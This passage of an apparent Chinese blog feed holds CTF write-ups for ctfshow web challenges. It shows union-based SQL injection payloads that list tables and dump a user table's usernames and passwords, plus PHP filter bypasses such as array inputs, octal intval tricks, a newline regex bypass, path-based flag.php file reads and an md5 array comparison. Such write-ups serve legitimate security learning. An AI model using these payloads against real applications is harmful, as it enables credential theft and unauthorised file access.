class="hljs-comment">#show</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_SCHEME));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_USER));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PASS));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_HOST));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PORT));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PATH));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_QUERY));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_FRAGMENT));<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">8</span>) &#123;<br>  [<span class="hljs-string">&quot;scheme&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br>  [<span class="hljs-string">&quot;host&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;hostname&quot;</span><br>  [<span class="hljs-string">&quot;port&quot;</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">9090</span>)<br>  [<span class="hljs-string">&quot;user&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;username&quot;</span><br>  [<span class="hljs-string">&quot;pass&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;password&quot;</span><br>  [<span class="hljs-string">&quot;path&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;/path&quot;</span><br>  [<span class="hljs-string">&quot;query&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;arg=value&quot;</span><br>  [<span class="hljs-string">&quot;fragment&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;anchor&quot;</span><br>&#125;<br><span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;hostname&quot;</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">9090</span>)<br><span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;/path&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;arg=value&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;anchor&quot;</span><br><br></code></pre></td></tr></table></figure><p>当parse_url()解析到邮箱时：@前面是user<br>file_get_contents()会访问host:port&#x2F;path，与user无关</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2023/09/15/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/09/15/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>常规sql注入<br>payload:</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() --+<br><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;ctfshow_user&#x27; --+<br><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> id,username,password <span class="hljs-keyword">from</span> ctfshow_user --+<br><br></code></pre></td></tr></table></figure><p>或<br>payload:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">-<span class="hljs-number">1</span>&#x27; or id=&#x27;<span class="hljs-number">26</span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php特性</title>
    <link href="/2023/09/14/phptexin/"/>
    <url>/2023/09/14/phptexin/</url>
    
    <content type="html"><![CDATA[<h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看代码发现<br>preg_match过滤0-9，即发现有0-9，就输出no no no，然而intval函数的作用是返回变量的整数值，两者相互矛盾</p><p>这里可以通过数组绕过，构造payload：?num[]&#x3D;<br><img src="/images/00.png"></p><p>获得flag</p><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>查看源码发现，第一个if是验证num是否存在，第二个if验证num是否为4476，如果是就出输出nonono，但第三个if是验证num<strong>取整</strong>后是否为4476，所以我们可以随便取一个4476.0-9，经过intval取整后即为4476符合条件，输出flag</p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/im&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonononono&#x27;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>查看源码<br>先看第一个if<br>preg_match()函数是用于一个正则表达式匹配<br>第一个if的意思是如果a的开头和结尾都是php，则进入下一个if<br>&#x2F;^php$&#x2F;im中 <strong>^</strong>表示开头 **$**表示结尾 &#x2F;i表示对大小写不敏感 &#x2F;m表示多行匹配</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(preg_match(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$a</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>这个if的意思是匹配a开头和结尾是php，不区分大小写，如果开头结尾为php，则输出hacker</p><p>仔细对比发现，第二个if的过滤对比第一个少了一个多行匹配&#x2F;m，这可以用到Apache HTTPD换行解析漏洞<br><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">传送门</a><br>大概意思是：以前的1.php可以用1%0aphp访问，%0a表示换行符，那么综上所述，就可以绕过函数的过滤<br>构造payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=a%0aphp<br></code></pre></td></tr></table></figure><p>a%0aphp,首先是preg_match中的$(匹配结尾)匹配a%0aphp中的换行符，这个时候会匹配到%0a(将%0a当作换行)，那么a%0aphp后面的php因为preg_match函数有个&#x2F;m(匹配多行)就是单独的一行了，满足第一个if，要求行开始和结尾都是php</p><p>其次是第二个if，第二个if要求$a中开头和结尾没有php，而这个preg_match函数中没有&#x2F;m匹配多行，所以就直接匹配abc，abc不满足第二个if，所以输出flag<br><img src="/images/232.png"></p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题方式与90题一样，第一个if验证num是否合格，第三个if则是如果num取整后等于4476则输出flag,这里可以?num&#x3D;4476.(1-9都可以)</p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>与92题解题方法一样，不同点在于93题加入了一个if函数来筛选，其实也不影响原本做题思路，加入了preg_match函数，作用是如果出现了a-z|A-Z的字符，就会输出nonono<br>下面还有一个函数intval，若num取整后等于4476，则输出flag，输入?num&#x3D;4476.2获取flag</p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>本题与前几题并无太大区别，我们注意到本题添加了一个if语句，strops(string，find，start)用于检测字符串在另一字符串出现的位置，满足strpos($num, “0”)语句的条件是num里的数有0返回true，没0返回flase，需要注意以下这个函数前面有一个！号，如果我们要绕过这个if语句，就需要使我们的num里含有0，这样就会绕过这个if，同时下一个取整函数也不会耽搁?num&#x3D;4476.01 or ?num&#x3D;4476.0皆可</p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|\./i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这次的preg_match函数不仅把字母过滤了还把.给过滤了，这样我们就不能进行上一题的操作了，我们可以利用进制转换的便利，这里我们可以用010574(4476的八进制)绕过，去看了看intval函数的发现最开头可以如果是+还是可以识别为原数，so，payload&#x3D;?num&#x3D;+010574</p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]==<span class="hljs-string">&#x27;flag.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br>    &#125;<br><br><br>&#125; <br></code></pre></td></tr></table></figure><p>第二个if表明了不能直接以相对路径读取，那么我们可以用绝对路径读<br>payload:?u&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>或者也可以返回上一级然后再回来读取<br>payload:?u&#x3D;..&#x2F;html&#x2F;flag.php<br>或者<br>payload:?u&#x3D;.&#x2F;flag.php</p><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>这一关使用MD5碰撞<br>而且使post方式所以要在hackbar里的post data里输入<br>我们这里使用数组的方式绕过，payload：a[]&#x3D;1 &amp; b[]&#x3D;2<br>可以看到页面上出现了warning，但也显示了flag，这是因为PHP对无法md5加密的东西不加密，结果为NULL，虽然会报错，但是null&#x3D;null，逻辑关系为True。所以可以输出flag。</p><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$_GET</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_POST</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_COOKIE</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_SERVER</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$flag</span>:<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>考点：变量覆盖、三元运算符、&amp;在php中的应用作用<br>第一句的意思是如果存在GET请求则引用POST请求的内容<br>所以我们url栏中随便填一填<br>然后再在hackbar上的post data输入关键句HTTP_FLAG&#x3D;flag<br>这样就成功回显了flag<br>所以第一句存在变量覆盖的效果，所以GET请求不管给什么东西都会被post请求覆盖掉</p><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$allow</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">36</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x36d</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$allow</span>, <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-variable">$i</span>));<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span 